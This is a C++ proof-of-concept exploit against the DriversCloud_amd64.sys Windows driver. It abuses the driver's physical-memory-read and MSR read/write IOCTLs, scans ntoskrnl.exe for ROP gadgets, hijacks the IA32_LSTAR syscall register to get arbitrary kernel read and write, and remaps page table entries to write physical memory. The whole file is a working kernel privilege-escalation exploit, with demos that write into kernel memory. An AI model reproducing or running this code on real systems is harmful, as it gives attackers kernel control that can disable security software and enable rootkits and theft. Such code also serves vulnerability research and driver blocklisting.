#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <stdint.h>

#define IOCTL_PHYS_READ   0x80FF2010
#define IOCTL_MSR_READ    0x80FF2024
#define IOCTL_MSR_WRITE   0x80FF2040

#define MSR_LSTAR         0xC0000082
#define MSR_FMASK         0xC0000084

#pragma pack(push, 1)

#define PHYS_BUF_TOTAL 0x1E8498
#define PHYS_DATA_MAX  2000000

struct PHYS_READ_REQ {
    uint32_t PhysAddrLow;
    uint32_t Size;
    uint8_t  Data[PHYS_DATA_MAX];
};

struct MSR_REQ {
    uint32_t Index;
    uint32_t Low;
    uint32_t High;
    uint8_t  Error;
};

#pragma pack(pop)

struct RopCtx {
    uint64_t popRcxRet;
    uint64_t popRaxRet;
    uint64_t popRdxRet;
    uint64_t wrmsrRet;
    uint64_t iretqAddr;
    uint64_t origLSTAR;
};

extern "C" void DoKernelWrite8(uint64_t targetVA, uint64_t value, RopCtx* ctx);
extern "C" void DoKernelRead8(uint64_t targetVA, uint64_t* outBuf, struct ReadRopCtx* ctx);

static HANDLE g_hDev = INVALID_HANDLE_VALUE;

static bool IoctlRaw(DWORD code, void* buf, DWORD size, DWORD* pOut) {
    return DeviceIoControl(g_hDev, code, buf, size, buf, size, pOut, NULL) != 0;
}

static uint64_t ReadMSR(uint32_t idx) {
    MSR_REQ m = {}; m.Index = idx;
    DWORD out = 0;
    if (!IoctlRaw(IOCTL_MSR_READ, &m, sizeof(m), &out)) {
        printf("[-] ReadMSR(0x%X) failed: %u\n", idx, GetLastError());
        return 0;
    }
    return ((uint64_t)m.High << 32) | m.Low;
}

static void WriteMSR(uint32_t idx, uint64_t val) {
    MSR_REQ m = {};
    m.Index = idx;
    m.Low   = (uint32_t)(val);
    m.High  = (uint32_t)(val >> 32);
    DWORD out = 0;
    if (!IoctlRaw(IOCTL_MSR_WRITE, &m, sizeof(m), &out))
        printf("[-] WriteMSR(0x%X) failed: %u\n", idx, GetLastError());
}

static bool ReadPhysical(uint64_t pa, void* dst, uint32_t len) {
    if (len == 0 || len > PHYS_DATA_MAX) return false;
    if (pa > 0xFFFFFFFFULL) return false;
    auto* r = (PHYS_READ_REQ*)VirtualAlloc(NULL, PHYS_BUF_TOTAL,
                                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!r) return false;
    r->PhysAddrLow = (uint32_t)pa;
    r->Size        = len;
    DWORD out = 0;
    bool ok = IoctlRaw(IOCTL_PHYS_READ, r, PHYS_BUF_TOTAL, &out);
    if (ok) memcpy(dst, r->Data, len);
    VirtualFree(r, 0, MEM_RELEASE);
    return ok;
}

static uint64_t ReadPhys8(uint64_t pa) {
    uint64_t val = 0;
    ReadPhysical(pa, &val, 8);
    return val;
}

struct NtInfo {
    uint64_t vaBase;
    uint8_t* fileBase;
    DWORD    fileSize;
};

static bool GetNtoskrnlVABase(uint64_t& base) {
    LPVOID drivers[1024]; DWORD needed;
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) return false;
    base = (uint64_t)drivers[0];
    return base != 0;
}

static bool LoadNtoskrnlFromDisk(NtInfo& ni) {
    if (!GetNtoskrnlVABase(ni.vaBase)) {
        printf("[-] EnumDeviceDrivers failed\n"); return false;
    }
    printf("[+] ntoskrnl VA base = 0x%llX\n", ni.vaBase);

    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntoskrnl.exe",
                               GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open ntoskrnl.exe: %u\n", GetLastError());
        return false;
    }
    ni.fileSize = GetFileSize(hFile, NULL);
    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    CloseHandle(hFile);
    if (!hMap) { printf("[-] CreateFileMapping failed\n"); return false; }

    ni.fileBase = (uint8_t*)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap);
    if (!ni.fileBase) { printf("[-] MapViewOfFile failed\n"); return false; }

    printf("[+] Loaded ntoskrnl.exe from disk (%u bytes)\n", ni.fileSize);
    return true;
}

static uint64_t ScanForGadget(const NtInfo& ni, const uint8_t* pat, size_t patLen,
                               const char* name) {
    uint32_t peOff   = *(uint32_t*)(ni.fileBase + 0x3C);
    uint16_t numSec  = *(uint16_t*)(ni.fileBase + peOff + 6);
    uint16_t optSize = *(uint16_t*)(ni.fileBase + peOff + 20);
    uint8_t* secTbl  = ni.fileBase + peOff + 24 + optSize;

    for (int s = 0; s < numSec && s < 20; s++) {
        uint8_t* sec = secTbl + s * 40;
        uint32_t secRva     = *(uint32_t*)(sec + 12);
        uint32_t secVSize   = *(uint32_t*)(sec + 8);
        uint32_t secRawOff  = *(uint32_t*)(sec + 20);
        uint32_t secRawSize = *(uint32_t*)(sec + 16);
        uint32_t secChars   = *(uint32_t*)(sec + 36);
        if (!(secChars & 0x20000000)) continue;

        uint8_t* data = ni.fileBase + secRawOff;
        uint32_t scanLen = min(secRawSize, secVSize);
        if (secRawOff + scanLen > ni.fileSize) continue;

        for (uint32_t i = 0; i + patLen <= scanLen; i++) {
            if (memcmp(data + i, pat, patLen) == 0) {
                uint64_t va = ni.vaBase + secRva + i;
                printf("[+] %-24s @ VA 0x%llX (RVA 0x%llX)\n",
                       name, va, (uint64_t)(secRva + i));
                return va;
            }
        }
    }
    printf("[-] %s gadget not found\n", name);
    return 0;
}

struct WriteCtx {
    uint64_t writeGadget;
    RopCtx   rop;
    bool     ready;
};

static WriteCtx g_wctx = {};

static bool InitWritePrimitive(const NtInfo& ni) {
    printf("\n=== Scanning for ROP gadgets ===\n");

    static const uint8_t P_WRITE[]    = { 0x48, 0x89, 0x02, 0xC3 };
    static const uint8_t P_POP_RCX[]  = { 0x59, 0xC3 };
    static const uint8_t P_POP_RAX[]  = { 0x58, 0xC3 };
    static const uint8_t P_POP_RDX[]  = { 0x5A, 0xC3 };
    static const uint8_t P_WRMSR[]    = { 0x0F, 0x30, 0xC3 };
    static const uint8_t P_IRETQ[]    = { 0x48, 0xCF };

    g_wctx.writeGadget   = ScanForGadget(ni, P_WRITE,   sizeof(P_WRITE),   "mov [rdx],rax; ret");
    g_wctx.rop.popRcxRet = ScanForGadget(ni, P_POP_RCX, sizeof(P_POP_RCX), "pop rcx; ret");
    g_wctx.rop.popRaxRet = ScanForGadget(ni, P_POP_RAX, sizeof(P_POP_RAX), "pop rax; ret");
    g_wctx.rop.popRdxRet = ScanForGadget(ni, P_POP_RDX, sizeof(P_POP_RDX), "pop rdx; ret");
    g_wctx.rop.wrmsrRet  = ScanForGadget(ni, P_WRMSR,   sizeof(P_WRMSR),   "wrmsr; ret");
    g_wctx.rop.iretqAddr = ScanForGadget(ni, P_IRETQ,   sizeof(P_IRETQ),   "iretq");

    if (!g_wctx.writeGadget   || !g_wctx.rop.popRcxRet ||
        !g_wctx.rop.popRaxRet || !g_wctx.rop.popRdxRet ||
        !g_wctx.rop.wrmsrRet  || !g_wctx.rop.iretqAddr) {
        printf("[-] Missing gadgets — write primitive unavailable\n");
        return false;
    }

    g_wctx.ready = true;
    printf("[+] All gadgets found — write primitive ready\n");
    return true;
}

static bool WriteKernel8(uint64_t kernelVA, uint64_t value) {
    if (!g_wctx.ready) return false;

    DWORD oldPriClass = GetPriorityClass(GetCurrentProcess());
    int   oldPri      = GetThreadPriority(GetCurrentThread());
    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    DWORD_PTR oldAff = SetThreadAffinityMask(GetCurrentThread(), 1);
    Sleep(1);

    uint64_t origLSTAR = ReadMSR(MSR_LSTAR);
    uint64_t origFMASK = ReadMSR(MSR_FMASK);

    WriteMSR(MSR_FMASK, origFMASK & ~0x40000ULL);

    g_wctx.rop.origLSTAR = origLSTAR;

    WriteMSR(MSR_LSTAR, g_wctx.writeGadget);

    DoKernelWrite8(kernelVA, value, &g_wctx.rop);

    WriteMSR(MSR_FMASK, origFMASK);

    SetThreadAffinityMask(GetCurrentThread(), oldAff);
    SetThreadPriority(GetCurrentThread(), oldPri);
    SetPriorityClass(GetCurrentProcess(), oldPriClass);
    return true;
}

struct ReadRopCtx {
    uint64_t popRcxRet;
    uint64_t popRaxRet;
    uint64_t popRdxRet;
    uint64_t wrmsrRet;
    uint64_t iretqAddr;
    uint64_t origLSTAR;
    uint64_t writeGadget;
};

static struct {
    uint64_t readGadget;
    ReadRopCtx rop;
    bool ready;
} g_rctx = {};

static bool InitReadPrimitive(const NtInfo& ni) {
    static const struct { uint8_t bytes[4]; uint8_t len; const char* name; } readGadgets[] = {
        { { 0x48, 0x8B, 0x02, 0xC3 }, 4, "mov rax,[rdx]; ret" },
        { { 0x48, 0x8B, 0x03, 0xC3 }, 4, "mov rax,[rbx]; ret" },
        { { 0x48, 0x8B, 0x06, 0xC3 }, 4, "mov rax,[rsi]; ret" },
        { { 0x48, 0x8B, 0x07, 0xC3 }, 4, "mov rax,[rdi]; ret" },
        { { 0x48, 0x8B, 0x00, 0xC3 }, 4, "mov rax,[rax]; ret" },
    };
    for (auto& g : readGadgets) {
        g_rctx.readGadget = ScanForGadget(ni, g.bytes, g.len, g.name);
        if (g_rctx.readGadget) break;
    }
    if (!g_rctx.readGadget) {
        printf("[-] No usable read gadget found\n");
        return false;
    }

    g_rctx.rop.popRcxRet   = g_wctx.rop.popRcxRet;
    g_rctx.rop.popRaxRet   = g_wctx.rop.popRaxRet;
    g_rctx.rop.popRdxRet   = g_wctx.rop.popRdxRet;
    g_rctx.rop.wrmsrRet    = g_wctx.rop.wrmsrRet;
    g_rctx.rop.iretqAddr   = g_wctx.rop.iretqAddr;
    g_rctx.rop.writeGadget = g_wctx.writeGadget;
    g_rctx.ready = true;
    printf("[+] Read primitive ready (mov rax,[rdx]; ret)\n");
    return true;
}

static uint64_t ReadKernel8(uint64_t kernelVA) {
    if (!g_rctx.ready) return 0;

    volatile uint64_t result = 0xDEADBEEFDEADBEEFULL;

    DWORD oldPriClass = GetPriorityClass(GetCurrentProcess());
    int   oldPri      = GetThreadPriority(GetCurrentThread());
    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    DWORD_PTR oldAff = SetThreadAffinityMask(GetCurrentThread(), 1);
    Sleep(1);

    uint64_t origLSTAR = ReadMSR(MSR_LSTAR);
    uint64_t origFMASK = ReadMSR(MSR_FMASK);

    WriteMSR(MSR_FMASK, origFMASK & ~0x40000ULL);
    g_rctx.rop.origLSTAR = origLSTAR;

    WriteMSR(MSR_LSTAR, g_rctx.readGadget);

    DoKernelRead8(kernelVA, (uint64_t*)&result, &g_rctx.rop);

    WriteMSR(MSR_FMASK, origFMASK);

    SetThreadAffinityMask(GetCurrentThread(), oldAff);
    SetThreadPriority(GetCurrentThread(), oldPri);
    SetPriorityClass(GetCurrentProcess(), oldPriClass);
    return result;
}

#define EPROC_DTB_OFF   0x28

#define KPCR_PRCB_OFF      0x180
#define KPRCB_CURTHREAD_OFF 0x008
#define KTHREAD_PROCESS_OFF 0x220

static uint64_t FindExportVA(const NtInfo& ni, const char* exportName);

static uint64_t FindSystemCR3_Targeted(const NtInfo& ni) {
    printf("\n=== Finding System CR3 via kernel pointer walk ===\n");

    if (!InitReadPrimitive(ni)) {
        printf("[-] Read primitive init failed\n");
        return 0;
    }

    uint64_t psInitVA = FindExportVA(ni, "PsInitialSystemProcess");
    if (!psInitVA) {
        printf("[-] PsInitialSystemProcess export not found\n");
        return 0;
    }
    printf("[+] PsInitialSystemProcess VA = 0x%llX\n", psInitVA);

    uint64_t eprocVA = ReadKernel8(psInitVA);
    printf("[+] System EPROCESS VA = 0x%llX\n", eprocVA);
    if ((eprocVA >> 48) != 0xFFFF) {
        printf("[-] Bad EPROCESS pointer\n");
        return 0;
    }

    uint64_t cr3 = ReadKernel8(eprocVA + EPROC_DTB_OFF);
    printf("[+] System CR3 = 0x%llX\n", cr3);
    if (cr3 == 0 || (cr3 & 0xFFF) != 0) {
        printf("[-] Bad CR3 value\n");
        return 0;
    }

    return cr3;
}

static uint64_t TranslateVA(uint64_t cr3, uint64_t va) {
    uint64_t pml4e_pa = (cr3 & ~0xFFFULL) + ((va >> 39) & 0x1FF) * 8;
    uint64_t pml4e = ReadPhys8(pml4e_pa);
    if (!(pml4e & 1)) return 0;

    uint64_t pdpte_pa = (pml4e & 0x000FFFFFFFFFF000ULL) + ((va >> 30) & 0x1FF) * 8;
    uint64_t pdpte = ReadPhys8(pdpte_pa);
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80)
        return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);

    uint64_t pde_pa = (pdpte & 0x000FFFFFFFFFF000ULL) + ((va >> 21) & 0x1FF) * 8;
    uint64_t pde = ReadPhys8(pde_pa);
    if (!(pde & 1)) return 0;
    if (pde & 0x80)
        return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL);

    uint64_t pte_pa = (pde & 0x000FFFFFFFFFF000ULL) + ((va >> 12) & 0x1FF) * 8;
    uint64_t pte = ReadPhys8(pte_pa);
    if (!(pte & 1)) return 0;

    return (pte & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
}

static uint64_t FindPteBase(const NtInfo& ni) {
    printf("[*] Extracting PTE_BASE from MiGetPteAddress...\n");

    uint32_t peOff   = *(uint32_t*)(ni.fileBase + 0x3C);
    uint16_t numSec  = *(uint16_t*)(ni.fileBase + peOff + 6);
    uint16_t optSize = *(uint16_t*)(ni.fileBase + peOff + 20);
    uint8_t* secTbl  = ni.fileBase + peOff + 24 + optSize;

    static const uint8_t SHR_RCX_9[] = { 0x48, 0xC1, 0xE9, 0x09 };

    for (int s = 0; s < numSec && s < 20; s++) {
        uint8_t* sec = secTbl + s * 40;
        uint32_t secRva     = *(uint32_t*)(sec + 12);
        uint32_t secRawOff  = *(uint32_t*)(sec + 20);
        uint32_t secRawSize = *(uint32_t*)(sec + 16);
        uint32_t secChars   = *(uint32_t*)(sec + 36);
        if (!(secChars & 0x20000000)) continue;

        uint8_t* data = ni.fileBase + secRawOff;
        if (secRawOff + secRawSize > ni.fileSize) continue;

        for (uint32_t i = 0; i + 30 <= secRawSize; i++) {
            if (memcmp(data + i, SHR_RCX_9, 4) != 0) continue;

            uint8_t* p = data + i + 4;
            uint8_t* end = data + i + 40;
            if (end > data + secRawSize) continue;

            int movCount = 0;
            uint64_t pteBase = 0;
            while (p + 10 <= end) {
                if (p[0] == 0x48 && p[1] == 0xB8) {
                    movCount++;
                    if (movCount == 2) {
                        pteBase = *(uint64_t*)(p + 2);
                        break;
                    }
                    p += 10;
                } else {
                    p++;
                }
            }

            if (movCount == 2 && (pteBase >> 48) == 0xFFFF) {
                printf("[+] PTE_BASE = 0x%llX (from MiGetPteAddress at RVA 0x%X)\n",
                       pteBase, secRva + i);
                return pteBase;
            }
        }
    }
    printf("[-] Could not extract PTE_BASE from ntoskrnl\n");
    return 0;
}

static uint64_t PteVaFor(uint64_t pteBase, uint64_t va) {
    return pteBase + ((va >> 12) << 3);
}

struct PhysWriteCtx {
    uint64_t cr3;
    uint64_t pteBase;
    uint64_t scratchVA;
    uint64_t scratchPteVA;
    uint64_t origPTE;
    bool     ready;
};

static PhysWriteCtx g_pwctx = {};

static bool InitPhysWrite(const NtInfo& ni) {
    printf("\n=== Initializing physical write primitive ===\n");

    g_pwctx.cr3 = FindSystemCR3_Targeted(ni);
    if (!g_pwctx.cr3) return false;

    g_pwctx.pteBase = FindPteBase(ni);
    if (!g_pwctx.pteBase) return false;

    g_pwctx.scratchVA = PteVaFor(g_pwctx.pteBase, ni.vaBase);

    g_pwctx.scratchPteVA = PteVaFor(g_pwctx.pteBase, g_pwctx.scratchVA);

    g_pwctx.origPTE = ReadKernel8(g_pwctx.scratchPteVA);
    printf("[+] Scratch VA = 0x%llX, PTE VA = 0x%llX\n",
           g_pwctx.scratchVA, g_pwctx.scratchPteVA);
    printf("[+] Original PTE = 0x%llX\n", g_pwctx.origPTE);

    if (!(g_pwctx.origPTE & 1)) {
        printf("[-] Scratch PTE not present\n");
        return false;
    }

    g_pwctx.ready = true;
    printf("[+] Physical write primitive ready\n");
    return true;
}

static bool WritePhysical8(uint64_t targetPA, uint64_t value) {
    if (!g_pwctx.ready) return false;

    uint64_t targetPagePA = targetPA & ~0xFFFULL;
    uint64_t pageOffset   = targetPA & 0xFFF;

    uint64_t newPTE = (g_pwctx.origPTE & 0xFFF0000000000FFFULL) |
                      (targetPagePA     & 0x000FFFFFFFFFF000ULL);

    if (!WriteKernel8(g_pwctx.scratchPteVA, newPTE)) return false;

    if (!WriteKernel8(g_pwctx.scratchVA + pageOffset, value)) {
        WriteKernel8(g_pwctx.scratchPteVA, g_pwctx.origPTE);
        return false;
    }

    WriteKernel8(g_pwctx.scratchPteVA, g_pwctx.origPTE);

    return true;
}

static uint64_t FindExportVA(const NtInfo& ni, const char* exportName) {
    uint32_t peOff     = *(uint32_t*)(ni.fileBase + 0x3C);
    uint32_t exportRva = *(uint32_t*)(ni.fileBase + peOff + 24 + 112);
    uint16_t numSec    = *(uint16_t*)(ni.fileBase + peOff + 6);
    uint16_t optSize   = *(uint16_t*)(ni.fileBase + peOff + 20);
    uint8_t* secTbl    = ni.fileBase + peOff + 24 + optSize;
    if (!exportRva) return 0;

    auto RvaToFileOff = [&](uint32_t rva) -> uint32_t {
        for (int i = 0; i < numSec; i++) {
            uint8_t* s = secTbl + i * 40;
            uint32_t sRva  = *(uint32_t*)(s + 12);
            uint32_t sRaw  = *(uint32_t*)(s + 20);
            uint32_t sSize = *(uint32_t*)(s + 16);
            if (rva >= sRva && rva < sRva + sSize) return sRaw + (rva - sRva);
        }
        return 0;
    };

    uint32_t expFileOff = RvaToFileOff(exportRva);
    if (!expFileOff) return 0;
    uint8_t* expDir    = ni.fileBase + expFileOff;
    uint32_t numNames  = *(uint32_t*)(expDir + 24);
    uint32_t namesOff  = RvaToFileOff(*(uint32_t*)(expDir + 32));
    uint32_t ordsOff   = RvaToFileOff(*(uint32_t*)(expDir + 36));
    uint32_t funcsOff  = RvaToFileOff(*(uint32_t*)(expDir + 28));
    if (!namesOff || !ordsOff || !funcsOff) return 0;

    for (uint32_t i = 0; i < numNames; i++) {
        uint32_t nameRva = *(uint32_t*)(ni.fileBase + namesOff + i * 4);
        uint32_t nameOff = RvaToFileOff(nameRva);
        if (!nameOff) continue;
        if (strcmp((const char*)(ni.fileBase + nameOff), exportName) == 0) {
            uint16_t ord  = *(uint16_t*)(ni.fileBase + ordsOff + i * 2);
            uint32_t fRva = *(uint32_t*)(ni.fileBase + funcsOff + ord * 4);
            return ni.vaBase + fRva;
        }
    }
    return 0;
}

static void DemoRead() {
    printf("\n=== Physical Memory READ demo ===\n");
    uint8_t buf[16];
    if (ReadPhysical(0, buf, sizeof(buf))) {
        printf("[+] First 16 bytes at PA 0x0: ");
        for (int i = 0; i < 16; i++) printf("%02X ", buf[i]);
        printf("\n");
    }
    uint64_t lstar = ReadMSR(MSR_LSTAR);
    printf("[+] IA32_LSTAR (KiSystemCall64) = 0x%llX\n", lstar);
}

static void DemoWrite(const NtInfo& ni) {
    printf("\n=== Kernel VA WRITE demo (crash-safe LSTAR hijack) ===\n");

    if (!InitWritePrimitive(ni)) {
        printf("[-] Write primitive init failed\n");
        return;
    }

    uint64_t ntBuildVA = FindExportVA(ni, "NtBuildNumber");
    if (!ntBuildVA) { printf("[-] NtBuildNumber not found\n"); return; }
    printf("[+] NtBuildNumber VA = 0x%llX\n", ntBuildVA);

    OSVERSIONINFOW osvi = {}; osvi.dwOSVersionInfoSize = sizeof(osvi);
    typedef NTSTATUS(WINAPI* pRtlGetVersion)(OSVERSIONINFOW*);
    auto fn = (pRtlGetVersion)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    if (fn) fn(&osvi);
    printf("[+] OS Build = %u (from RtlGetVersion)\n", osvi.dwBuildNumber);

    uint32_t buildVal = (uint32_t)osvi.dwBuildNumber | 0xF0000000u;
    printf("[*] Writing NtBuildNumber = 0x%X (same value — safe)...\n", buildVal);

    if (WriteKernel8(ntBuildVA, (uint64_t)buildVal)) {
        printf("[+] WriteKernel8 OK — LSTAR hijack + ROP restore works!\n");
    } else {
        printf("[-] WriteKernel8 failed\n");
    }
}

static void DemoPhysWrite(const NtInfo& ni) {
    printf("\n=== Physical WRITE demo (PTE remapping) ===\n");

    if (!InitPhysWrite(ni)) {
        printf("[-] Physical write init failed\n");
        return;
    }

    uint64_t testPA = 0x1000;
    uint64_t origVal = ReadPhys8(testPA);
    printf("[+] PA 0x%llX original value: 0x%llX\n", testPA, origVal);

    printf("[*] Writing same value back via PTE remap...\n");
    if (WritePhysical8(testPA, origVal)) {
        uint64_t verify = ReadPhys8(testPA);
        printf("[+] PA 0x%llX after write:    0x%llX\n", testPA, verify);
        if (verify == origVal)
            printf("[+] PHYSICAL WRITE VERIFIED — PTE remap works!\n");
        else
            printf("[!] Mismatch (may be expected for MMIO/reserved regions)\n");
    } else {
        printf("[-] WritePhysical8 failed\n");
    }
}

int main() {
    printf("=== DriversCloud_amd64.sys Exploit POC ===\n");
    printf("=== Phys Read + MSR R/W + Crash-safe LSTAR Hijack  ===\n\n");

    g_hDev = CreateFileA("\\\\.\\DriversCloud_amd64",
                         GENERIC_READ | GENERIC_WRITE,
                         0, NULL, OPEN_EXISTING, 0, NULL);
    if (g_hDev == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open device (err %u). Is driver loaded?\n", GetLastError());
        return 1;
    }
    printf("[+] Device handle acquired\n");

    DemoRead();

    NtInfo ni = {};
    if (!LoadNtoskrnlFromDisk(ni)) {
        printf("[-] ntoskrnl load failed\n");
        CloseHandle(g_hDev);
        return 1;
    }

    DemoWrite(ni);

    if (ni.fileBase) UnmapViewOfFile(ni.fileBase);
    CloseHandle(g_hDev);
    printf("\n[+] Done.\n");
    return 0;
}
